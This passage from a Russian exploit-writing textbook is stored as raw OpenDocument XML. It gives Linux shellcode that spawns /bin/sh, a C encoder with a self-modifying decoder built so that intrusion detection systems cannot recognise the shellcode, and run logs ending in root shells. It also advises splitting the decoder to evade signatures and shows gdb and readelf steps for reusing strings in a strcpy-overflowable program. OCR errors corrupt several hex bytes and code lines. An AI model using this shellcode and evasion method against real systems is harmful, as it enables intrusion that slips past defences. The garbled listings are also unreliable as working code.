          <text:p text:style-name="P73">После того как shell-код будет декодирован, выполняется команда «jmp short ok». Именно с метки ok: и начинается декодированный shell-код, так что в результате этой команды начнется его исполнение;</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3">Если откомпилировать декодер и преобразовать его в строку 16-ричных символов, то получим: </text:p>
      <text:p text:style-name="P52">char decoder[] = <text:span text:style-name="T1">"</text:span>\xeb\xl0\x5e\x31\xc9\xbl\<text:span text:style-name="T18">x00</text:span>\x80\x6c\x0e\xff\<text:span text:style-name="T18">x00</text:span>\xfe\xc9\x75" "\xf7\xeb\x05\xe8\xeb\xff\xff\xff";</text:p>
      <text:p text:style-name="P3">Напомним, что первый нулевой байт эксплойт должен заменить длиной закодированного shell-кода, а второй - числом, которым shell-код был закодирован. </text:p>
      <text:p text:style-name="P3">Программа, приведенная в примере, кодирует shell-код, реализующий вызов <text:span text:style-name="T9">execve/bin/sh</text:span> в Linux, который был продемонстрирован выше. Затем она модифицирует декодер, вставляя в него длину shell-кода и использованное случайное число. В заключение декодер помещается непосредственно перед shell-кодом, результат выводится на <text:span text:style-name="T9">stdout</text:span> и закодированный shell-код выполняется. </text:p>
      <text:p text:style-name="P3">Пример. Реализация декодера</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>1 #include &lt;sys/time.h&gt; </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>2 #include &lt;stdlib.h&gt; </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>3 #include &lt;unistd.h&gt; </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>4 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>5 int getnumber(int quo) </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>6 <text:span text:style-name="T1">{</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>7 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>int seed; </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>8 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>struct timeval tm; </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>9 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>gettimeofday(&amp;tm,NULL); </text:p>
      <text:p text:style-name="P11">10 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>seed = tm.tv_sec <text:span text:style-name="T1">+</text:span> tm.tv_usec; </text:p>
      <text:p text:style-name="P11">11 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>srandom(seed); </text:p>
      <text:p text:style-name="P11"><text:soft-page-break/>12 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>return(random()<text:span text:style-name="T1">%</text:span>quo); </text:p>
      <text:p text:style-name="P11">13 } </text:p>
      <text:p text:style-name="P11">14 </text:p>
      <text:p text:style-name="P11">15 <text:span text:style-name="T1">v</text:span>oid <text:span text:style-name="T1">execute</text:span>(c<text:span text:style-name="T1">har</text:span> *<text:span text:style-name="T1">data</text:span>) </text:p>
      <text:p text:style-name="P11">16 { </text:p>
      <text:p text:style-name="P11">17 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>int *ret; </text:p>
      <text:p text:style-name="P11">18 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>ret = (int *)&amp;ret + 2; </text:p>
      <text:p text:style-name="P11">19 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>(*ret) = (int)data; </text:p>
      <text:p text:style-name="P11">20 } </text:p>
      <text:p text:style-name="P11">21 </text:p>
      <text:p text:style-name="P11">22 void print_code(char *data) { </text:p>
      <text:p text:style-name="P11">23 </text:p>
      <text:p text:style-name="P11">24 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>int i,l = 15; </text:p>
      <text:p text:style-name="P11">25 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>printf("\n\nchar code[] =\n"); </text:p>
      <text:p text:style-name="P11">26 </text:p>
      <text:p text:style-name="P11">27 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>for(i = 0; i &lt; strlen(data); ++i) { </text:p>
      <text:p text:style-name="P11">28 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>if <text:span text:style-name="T1">(l</text:span> &gt;= 15) { </text:p>
      <text:p text:style-name="P11">29 <text:span text:style-name="T1"><text:s text:c="6"/></text:span>if (i) </text:p>
      <text:p text:style-name="P11">30 <text:span text:style-name="T1"><text:s text:c="8"/></text:span>printf("\"\n"); </text:p>
      <text:p text:style-name="P11">31 <text:span text:style-name="T1"><text:s text:c="6"/></text:span>printf("\t\"") ; </text:p>
      <text:p text:style-name="P11">32 <text:span text:style-name="T1"><text:s text:c="6"/>l</text:span> = 0; </text:p>
      <text:p text:style-name="P11">33 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>} </text:p>
      <text:p text:style-name="P11">34 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>++<text:span text:style-name="T1">l</text:span>; </text:p>
      <text:p text:style-name="P11">35 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>printf("\\x%02x", ((unsigned char *)data)[i]); </text:p>
      <text:p text:style-name="P11">36 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>} </text:p>
      <text:p text:style-name="P11">37 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>printf("\";\n\n\n"); </text:p>
      <text:p text:style-name="P11">38 } </text:p>
      <text:p text:style-name="P11">39 </text:p>
      <text:p text:style-name="P11">40 int main () { </text:p>
      <text:p text:style-name="P11">41 </text:p>
      <text:p text:style-name="P11">42 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>char shellcode[] = </text:p>
      <text:p text:style-name="P11">43 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>"\x31\xc0\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" </text:p>
      <text:p text:style-name="P11">44 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>"\x6e\x89\xe3\x50\x53\x89\xel\xb0\x0b\xcd\x80"; </text:p>
      <text:p text:style-name="P11">45 </text:p>
      <text:p text:style-name="P11">46 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>char decoder[] = </text:p>
      <text:p text:style-name="P11">47 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>"\xeb\xl0\x5e\x31\xc9\xbl\x00\x80\x6c\x0e\xff\x00\xfe" </text:p>
      <text:p text:style-name="P11">48 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>"\xc9\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff"; </text:p>
      <text:p text:style-name="P11">49 </text:p>
      <text:p text:style-name="P11">50 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>int count; </text:p>
      <text:p text:style-name="P11">51 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>int number = <text:span text:style-name="T1">getnumber(200</text:span>);<text:tab/><text:tab/><text:tab/>// случ.целое <text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T8"> 200</text:span> </text:p>
      <text:p text:style-name="P11">52 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>int nullbyte = 0; </text:p>
      <text:p text:style-name="P11">53 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>int ldecoder; <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>// длина декодера</text:p>
      <text:p text:style-name="P11">54 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>int lshellcode = strlen(shellcode); <text:tab/>// длина <text:span text:style-name="T1">shell-</text:span><text:span text:style-name="T8">кода</text:span></text:p>
      <text:p text:style-name="P11">55 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>char *result; </text:p>
      <text:p text:style-name="P11">56 </text:p>
      <text:p text:style-name="P11">57 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>printf("Для кодирования shell-кода используется значение <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>%d\n"/number); </text:p>
      <text:p text:style-name="P11">58 </text:p>
      <text:p text:style-name="P11">59 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>decoder[6] += lshellcode; <text:tab/><text:tab/><text:tab/>// модификация</text:p>
      <text:p text:style-name="P11">60 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>decoder[11] += number; <text:tab/><text:tab/><text:tab/><text:tab/>// декодера</text:p>
      <text:p text:style-name="P11">61 </text:p>
      <text:p text:style-name="P11">62 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>ldecoder = strlen(decoder); </text:p>
      <text:p text:style-name="P11">63 </text:p>
      <text:p text:style-name="P11">64 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>do { <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>// кодирование</text:p>
      <text:p text:style-name="P11">65 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>if(nullbyte == 1) { </text:p>
      <text:p text:style-name="P11">66 <text:span text:style-name="T1"><text:s text:c="6"/></text:span>number = <text:span text:style-name="T1">getnumber(10</text:span>); </text:p>
      <text:p text:style-name="P11">67 <text:span text:style-name="T1"><text:s text:c="6"/></text:span>decoder[11] += number; </text:p>
      <text:p text:style-name="P11">68 <text:span text:style-name="T1"><text:s text:c="6"/></text:span>nullbyte = 0; </text:p>
      <text:p text:style-name="P11">69 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>} </text:p>
      <text:p text:style-name="P11">70 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>for(count=0; count &lt; lshellcode; count++) { </text:p>
      <text:p text:style-name="P11">71 <text:span text:style-name="T1"><text:s text:c="6"/></text:span>shellcode[count] += number; <text:tab/><text:tab/>// собственно</text:p>
      <text:p text:style-name="P11">72 <text:span text:style-name="T1"><text:s text:c="6"/></text:span>if(shellcode[count] == ' \0') { <text:tab/>// кодирование</text:p>
      <text:p text:style-name="P11">73 <text:span text:style-name="T1"><text:s text:c="8"/></text:span>nullbyte = 1; <text:tab/><text:tab/><text:tab/><text:tab/>// с проверкой 0</text:p>
      <text:p text:style-name="P11">74 <text:span text:style-name="T1"><text:s text:c="6"/></text:span>} </text:p>
      <text:p text:style-name="P11">75 <text:span text:style-name="T1"><text:s text:c="4"/></text:span>} </text:p>
      <text:p text:style-name="P11">76 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>} while(nullbyte == 1);<text:tab/><text:tab/><text:tab/>// повтор с другим кодом </text:p>
      <text:p text:style-name="P11">77 </text:p>
      <text:p text:style-name="P11">78 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>result = malloc(lshellcode + ldecoder); </text:p>
      <text:p text:style-name="P11">79 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>strcpy(result,decoder); <text:tab/><text:tab/><text:tab/>// получение исполняемого</text:p>
      <text:p text:style-name="P11">80 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>strcat(result,shellcode); <text:tab/><text:tab/>// <text:span text:style-name="T1">shell-</text:span><text:span text:style-name="T8">кода</text:span></text:p>
      <text:p text:style-name="P11">81 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>print_code(result); <text:tab/><text:tab/><text:tab/>// печать</text:p>
      <text:p text:style-name="P11">82 <text:span text:style-name="T1"><text:s text:c="2"/></text:span>execute(result); <text:tab/><text:tab/><text:tab/><text:tab/>// исполнение</text:p>
      <text:p text:style-name="P11">83 }</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ </text:h>
      <text:list xml:id="list1722070760146586547" text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P74">Мы рассмотрим только функцию <text:span text:style-name="T9">main</text:span>()y поскольку именно там и происходит все интересное. Сначала инициализируются переменные. В строке 51 переменной <text:span text:style-name="T9">number</text:span> присваивается случайное целое значение, меньшее 200. Оно будет использовано для кодирования shell-кода. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P74">В строках 53 и 54 объявляются переменные для хранения размеров декодера и shell-кода соответственно. Переменной <text:span text:style-name="T9">lshellcode</text:span> (длина shell-кода) значение присваивается немедленно, а переменная <text:span text:style-name="T9">ldecoder</text:span> (длина <text:soft-page-break/>декодера) будет инициализирована позже, когда в строке, представляющей декодер, не останется нулевых байтов. Дело в том, что функция <text:span text:style-name="T9">strlen</text:span> возвращает число байтов в строке до первого нулевого байта. Поскольку в декодере специально оставлены два нулевых байта, то нельзя вычислять его длину, пока они не будут заменены. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P74">Модификация декодера происходит в строках 59 и 60. Длину shcll-кода мы записываем в decoder[6], а использованное для кодировании число - в decoder[ll]. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P74">Кодирование shell-кода производится в двух циклах в строках 64 - 76. В строках 70-75 мы выполняем собственно кодирование, то есть прибавление случайного числа к каждому байту. При этом внутри цикла (строка 72) проверяется, не стал ли в результате этой операции какой нибудь байт равен нулю. Если это так, то переменной <text:span text:style-name="T9">nullbyt</text:span><text:span text:style-name="T2">e</text:span> присвается значение 1.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P74">После того как вся строка обработана, мы начинаем все сначала, если в shell-коде появился нулевой байт (строка 76). В этом случае генерируется новое случайное число (строка 66), опять модифицируется декодер (строка 67), признак <text:span text:style-name="T9">nullbyte</text:span> сбрасывается в 0, и мы заново кодируем shell-код.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P74">Как только кодирование завершится успешно, мы выделяем область памяти, размер которой равен сумме длин декодера и shell-кода (строка 78). </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P74">Затем декодер и shell-код копируются в эту область, они готовы для использования в эксплойте. В строке 81 мы распечатываем содержимое массива <text:span text:style-name="T9">result</text:span> на <text:span text:style-name="T9">stdout</text:span>, чтобы убедиться, что при каждом выполнении программы shell-код действительно оказывается другим. После распечатки shell-код исполняется.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1">При запуске показанной выше программы два раза подряд были получены следующие результаты:</text:p>
      <text:p text:style-name="P5">[root@gabriel sub-decoder]# ./encode </text:p>
      <text:p text:style-name="P1">Для кодирования shell-кода используется значение 152 </text:p>
      <text:p text:style-name="P53">char code[] = </text:p>
      <text:p text:style-name="P2">"<text:span text:style-name="T18">\xeb\xl0\x5e\x31\xc9\xbl\xl8\x80\x6c\x0e\xff\x9c\xfe\xc9\x75" </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T18">"\xf7\xeb\x05\xe8\xeb\xff\xff\xff</text:span>\xcd\x5c\x35\xee\x04\xcb\xcb" </text:p>
      <text:p text:style-name="P2">"\x0f\x04\x04\xcb\xfe\x05\x0a\x25\x7f\xec\xef\x25\x7d\x4c\xa7" </text:p>
      <text:p text:style-name="P2">"\x69\xlc";</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">sh-2.04# exit </text:p>
      <text:p text:style-name="P5">[root@gabriel sub-decoder]# ./encode </text:p>
      <text:p text:style-name="P1">Для кодирования shell-кода используется значение 104 </text:p>
      <text:p text:style-name="P5">char code[] = </text:p>
      <text:p text:style-name="P55">"<text:span text:style-name="T18">\xeb\xl0\x5e\x31\xc9\xbl\xl8\x80\x6c\x0e\xff\x68\xfe\xc9\x75" </text:span></text:p>
      <text:p text:style-name="P55"><text:span text:style-name="T18">"\xf7\xeb\x05\xe8\xeb\xff\xff\xff</text:span>\x99\x28\x01\xba\xd0\x97\x97" </text:p>
      <text:p text:style-name="P54">"\xdb\xd0\xd0\x97\xca\xdl\xd6\xfl\x4b\xb8\xbb\xfl\x4 9\xl8\x73" </text:p>
      <text:p text:style-name="P56">"\x35\xe8"; </text:p>
      <text:p text:style-name="P5">sh-2.04# exit </text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ </text:h>
      <text:p text:style-name="P3">Полужирным шрифтом выделен shell-код, выполняющий <text:span text:style-name="T9">execve</text:span>. Как видно, он очень отличается от исходного варианта. Никакая IDS не сможет опознать в этой строке shell-код. Сейчас программа устроена так, что shell-код заново кодируется, если в результирующей строке оказывается нулевой байт. Можно модифицировать алгоритм так, что не будут допускаться и другие символы, например, новой строки или косой черты. </text:p>
      <text:p text:style-name="P3">Но одна проблема остается. Декодер получился довольно длинным и для него самого можно создать в IDS сигнатуру. Справиться с этим можно только одним способом - разбить декодер на много мелких частей, написать каждую часть с помощью различных команд и создать функцию, которая соберет готовый декодер, объединяя случайно выбранные функционально эквивалентные фрагменты в правильном порядке. </text:p>
      <text:p text:style-name="P3">Например, в строке 11 ассемблерного текста декодера мы уменьшаем регистр CL командой <text:span text:style-name="T11">dec</text:span>. Но вместо нее можно было бы использовать <text:span text:style-name="T11">«sub cl,l»</text:span> или комбинацию <text:span text:style-name="T11">«add cl,lll»</text:span> и <text:span text:style-name="T11">«sub cl,110»</text:span>. Такой декодер можно было бы поместить в конец shell-кода, а в его начало тогда следовало бы поместить команду перехода (<text:span text:style-name="T11">jmp</text:span>) на начало декодера. Ну и, разумеется, сам декодер пришлось бы слегка изменить. Помимо разбиения декодера на части можно еще написать несколько декодеров с разными алгоритмами. В сочетании все эти приемы позволяют получить хорошо замаскированные эксплойты, не поддающиеся обнаружению современными IDS. </text:p>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">Повторное использование переменных программы</text:h>
      <text:p text:style-name="P3">Для уменьшения размера <text:s/>shell-кода можно попытаться использовать для своих целей уже объявленные в программе переменные и строки. Основной недостаток этой техники состоит в том, что эксплойт будет <text:s/>работать только для одной версии программы, собранной строго <text:s/>определенным компилятором.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/>Программы с открытыми исходными текстами</text:h>
      <text:p text:style-name="P3">Если имеется исходный текст программы, то найти в нем нужные <text:s/><text:line-break/>переменные нетрудно. Поищите переменные, в которых хранятся введенные <text:s/><text:line-break/>пользователем данные, <text:s/>откомпилируйте программу и посмотрите, по каким адресам в памяти размещаются пригодные для повторного использования переменные. Предположим, что мы хотим написать эксплойт для переполнения буфера в следующей программе:</text:p>
      <text:p text:style-name="P5">void abuse() {</text:p>
      <text:p text:style-name="P11"><text:s text:c="2"/>char command[] = "/bin/sh"; </text:p>
      <text:p text:style-name="P11"><text:s text:c="2"/>printf("%s\n",command); </text:p>
      <text:p text:style-name="P11">} </text:p>
      <text:p text:style-name="P11">int main(int argc,char **argv) { </text:p>
      <text:p text:style-name="P11"><text:s text:c="2"/>char buf[256]; </text:p>
      <text:p text:style-name="P11"><text:s text:c="2"/>strcpy(buf,argc[1]); </text:p>
      <text:p text:style-name="P11"><text:s text:c="2"/>abuse() ; </text:p>
      <text:p text:style-name="P11">}</text:p>
      <text:p text:style-name="P3">Как видите, в функции abuse() встречается строка «/bin/sh». Прежде чем воспользоваться этой строкой, нужно найти ее адрес в памяти. Для этой цели пригодится отладчик GDB </text:p>
      <text:p text:style-name="P5">bash-2.05b$ gdb -q reusage</text:p>
      <text:p text:style-name="P87">(no <text:span text:style-name="T1">debuqqing</text:span> symbols found)...(gdb) <text:s/>3 (gdb) disassemble abuse <text:s/>4 dump of assembler code for function abuse: </text:p>
      <text:p text:style-name="P87">0x8048538 &lt;abuse&gt;: <text:tab/><text:tab/>push %ebp <text:line-break/>0x8048539 &lt;abuse+l&gt;: <text:tab/><text:tab/>mov %esp,%ebp <text:line-break/>0x804853b &lt;abuse+3&gt;: <text:tab/><text:tab/>sub $0x8,%esp <text:line-break/>0x804853e &lt;abuse+6&gt;: <text:tab/><text:tab/>mov 0x8048628,%eax <text:line-break/>0x8048543 &lt;abuse+ll&gt;: <text:tab/>mov 0x804862c,%edx <text:line-break/>0x8048549 &lt;abuse+17&gt;: <text:tab/>mov %eax,Oxfffffff8(%ebp) <text:line-break/>0x804854c &lt;abuse+20&gt;: <text:tab/>mov %esx,Oxfffffffс(%ebp)<text:line-break/>0x804854f &lt;abuse+23&gt;: <text:tab/>sub $0x8,%esp <text:line-break/>0x8048552 &lt;abuse+26&gt;: <text:tab/>lea Oxfffffff8(%ebp),%eax<text:line-break/>0x8048555 &lt;abuse+29&gt;: <text:tab/>push %eax <text:line-break/>0x8048556 &lt;abuse+30&gt;: <text:tab/>push $0x8048630 <text:line-break/>0x804855b &lt;abuse+35&gt;: <text:tab/>call 0x80483cc &lt;printf&gt;<text:line-break/>0x8048560 &lt;abuse+40&gt;: <text:tab/>add $0xl0,%esp<text:line-break/>0x8048563 &lt;abuse+43&gt;: <text:tab/>leave<text:line-break/>0x8048564 &lt;abuse+44&gt;: <text:tab/>ret <text:line-break/>0x8048565 &lt;abuse+45&gt;: <text:tab/>lea 0x0(%esi),%esi<text:line-break/>End of assembler dump. <text:line-break/><text:span text:style-name="T38">(gdb) x/10 0x8048628 <text:line-break/>0x8048628 &lt;_fini+84&gt;: <text:s/>0x6e69622f 0x0068732f 0x000a7325 0x65724624<text:line-break/>0x8048638 &lt;_fini+100&gt;: 0x44534265 0x7273203a 0x696c2f63</text:span><text:span text:style-name="T22"> 0x73632f62</text:span><text:line-break/>0x8048648 &lt;_fini+116&gt;: <text:span text:style-name="T22">0x33692f75 0x652d3638</text:span><text:line-break/>(gdb) bash-2.05b$ </text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ</text:h>
      <text:list xml:id="list7885710237954233361" text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P75">Сначала мы открываем файл в gdb (строка 1) и дизассемблируем функцию <text:span text:style-name="T9">abuse</text:span>() (строка 3), поскольку из исходного текста знаем, что именно в ней встречается строка «/bin/sh», которая передается функции <text:span text:style-name="T9">printf</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P75">В строке 22 мы с помощью команды <text:span text:style-name="T9">х</text:span> просматриваем содержимое памяти, используемой этой функцией, и обнаруживаем, что искомая строка находится по адресу 0x8048628. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1">Зная адрес, нет необходимости помещать саму строку в shell-код, поэтому его размер можно заметно сократить. </text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Программы с недоступными исходными текстами </text:h>
      <text:p text:style-name="P3">Строки и другие переменные компилятор часто размещает в статически распределенной области памяти, к которой можно обращаться в любой момент исполнения программы. В формате ELF, который чаще всего применяется для исполняемых файлов в системах Linux и *BSD, данные программы хранятся в специальных сегментах. Так, строки и прочие переменные находятся обычно в сегментах «.rodata» и «.data».</text:p>
      <text:p text:style-name="P3">Утилита <text:span text:style-name="T10">read</text:span><text:span text:style-name="T3">elf</text:span> позволяет легко получить информацию обо всех сегментах двоичного файла. Для этого предназначен флаг -S</text:p>
      <text:p text:style-name="P86"><text:span text:style-name="T11">bash-2.05b$ readelf -S reusage <text:line-break/>There are 22 section headers, starting at offset 0x8fc: <text:line-break/>[Nr] Name </text:span><text:span text:style-name="T12"><text:s text:c="10"/></text:span><text:span text:style-name="T11">Type </text:span><text:span text:style-name="T12"><text:s text:c="5"/>Addr <text:s text:c="5"/>Off <text:s text:c="4"/>Size <text:s text:c="3"/>ES Flg Lk Inf A1</text:span><text:span text:style-name="T11"><text:line-break/>[ 0] </text:span><text:span text:style-name="T12"><text:s text:c="15"/></text:span><text:span text:style-name="T11">NULL </text:span><text:span text:style-name="T12"><text:s text:c="5"/>00000000 <text:s/>000000 <text:s/>000000 <text:s/>00 <text:s text:c="5"/>0 <text:s text:c="2"/>0 <text:s/>0</text:span><text:span text:style-name="T11"><text:line-break/>[ </text:span><text:span text:style-name="T12">1] .interp <text:s text:c="7"/>PROGBITS <text:s/>080480f4 <text:s/>0000f4 <text:s/>000019 <text:s/>00 <text:s text:c="2"/>A <text:s/>0 <text:s text:c="2"/>0 <text:s/>1</text:span><text:span text:style-name="T11"><text:line-break/>[ 2] </text:span><text:span text:style-name="T12">.note.ABI-tag <text:s/>NOTE <text:s text:c="5"/>08048110 <text:s/>000110 <text:s/>000018 <text:s/>00 <text:s text:c="2"/>A <text:s/>0 <text:s text:c="2"/>0 <text:s/>4</text:span><text:span text:style-name="T11"><text:line-break/>[ 3] .hash </text:span><text:span text:style-name="T12"><text:s text:c="9"/>HASH <text:s text:c="5"/>08048128 <text:s/>000128 <text:s/>000090 <text:s/>00 <text:s text:c="2"/>A <text:s/>4 <text:s text:c="2"/>0 <text:s/>4</text:span><text:span text:style-name="T11"><text:line-break/>[ 4] </text:span><text:span text:style-name="T12">.</text:span><text:span text:style-name="T11">dynsym </text:span><text:span text:style-name="T12"><text:s text:c="7"/>DYNSYM <text:s text:c="3"/>080481b8 <text:s/>0001b8 <text:s/>000110 <text:s/>10 <text:s text:c="2"/>A <text:s/>5 <text:s text:c="2"/>1 <text:s/>4</text:span><text:span text:style-name="T11"><text:line-break/>[ 5] .dynstr </text:span><text:span text:style-name="T12"><text:s text:c="7"/>SYMTAB <text:s text:c="3"/>080482c8 <text:s/>0002c8 <text:s/>0000b8 <text:s/>00 <text:s text:c="2"/>A <text:s/>0 <text:s text:c="2"/>0 <text:s/>1</text:span><text:span text:style-name="T11"><text:line-break/>[ 6] .rel.plt </text:span><text:span text:style-name="T12"><text:s text:c="6"/>REL <text:s text:c="6"/>08048380 <text:s/>000380 <text:s/>000020 <text:s/>08 <text:s text:c="2"/>A <text:s/>4 <text:s text:c="2"/>8 <text:s/>4</text:span><text:span text:style-name="T11"><text:line-break/>[ 7] .init </text:span><text:span text:style-name="T12"><text:s text:c="9"/>PROGBITS <text:s/>080483a0 <text:s/>0003a0 <text:s/>00000b <text:s/>00 <text:s/>AX <text:s/>0 <text:s text:c="2"/>0 <text:s/>4</text:span><text:span text:style-name="T11"><text:line-break/>[ 8] .</text:span><text:span text:style-name="T12">plt</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12"><text:s text:c="10"/>PROGBITS <text:s/>080483ac <text:s/>ОООЗас <text:s/>000050 <text:s/>04 <text:s/>AX <text:s/>0 <text:s text:c="2"/>0 <text:s/>4</text:span><text:span text:style-name="T11"><text:line-break/>[ 9] .text </text:span><text:span text:style-name="T12"><text:s text:c="9"/>PROGBITS <text:s/>08048400 <text:s/>000400 <text:s/>0001d4 <text:s/>00 <text:s/></text:span><text:soft-page-break/><text:span text:style-name="T12">AX <text:s/>0 <text:s text:c="2"/>0 16</text:span><text:span text:style-name="T11"><text:line-break/>[10] .fini </text:span><text:span text:style-name="T12"><text:s text:c="9"/>PROGBITS <text:s/>080485d4 <text:s/>000006 <text:s/>00000b <text:s/>00 <text:s/>AX <text:s/>0 <text:s text:c="2"/>0 <text:s/>4</text:span><text:span text:style-name="T11"><text:line-break/>[11] .rodata </text:span><text:span text:style-name="T12"><text:s text:c="7"/>PROGBITS <text:s/>080485da <text:s/>0005da <text:s/>0000a7 <text:s/>00 <text:s text:c="2"/>A <text:s/>0 <text:s text:c="2"/>0 <text:s/>1</text:span><text:span text:style-name="T11"><text:line-break/>[12] .data </text:span><text:span text:style-name="T12"><text:s text:c="9"/>PROGBITS <text:s/>08049684 <text:s/>000684 <text:s/>00000c <text:s/>00 <text:s/>WA <text:s/>0 <text:s text:c="2"/>0 <text:s/>4</text:span><text:span text:style-name="T11"><text:line-break/>[13] .</text:span><text:span text:style-name="T12">eh_frame</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12"><text:s text:c="5"/>PROGBITS <text:s/>08049690 <text:s/>000690 <text:s/>000004 <text:s/>00 <text:s/>WA <text:s/>0 <text:s text:c="2"/>0 <text:s/>4</text:span><text:span text:style-name="T11"><text:line-break/>[14] .dynamic </text:span><text:span text:style-name="T12"><text:s text:c="6"/>DYNAMIC <text:s text:c="2"/>08049694 <text:s/>000694 <text:s/>000098 <text:s/>08 <text:s/>WA <text:s/>5 <text:s text:c="2"/>0 <text:s/>4</text:span><text:span text:style-name="T11"><text:line-break/>[15] .ctors </text:span><text:span text:style-name="T12"><text:s text:c="8"/></text:span><text:span text:style-name="T11">PROGBITS </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">0804972с </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00072с </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">000008 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">WA </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s text:c="2"/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">4<text:line-break/>[16] .dtors </text:span><text:span text:style-name="T12"><text:s text:c="8"/></text:span><text:span text:style-name="T11">PROGBITS </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">08049734 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">000734 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">000008 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">WA </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s text:c="2"/></text:span><text:span text:style-name="T11">0</text:span><text:span text:style-name="T12"> </text:span><text:span text:style-name="T11"><text:s/>4 <text:line-break/>[17] .jcr </text:span><text:span text:style-name="T12"><text:s text:c="10"/></text:span><text:span text:style-name="T11">PROGBITS </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">0804973c </text:span><text:span 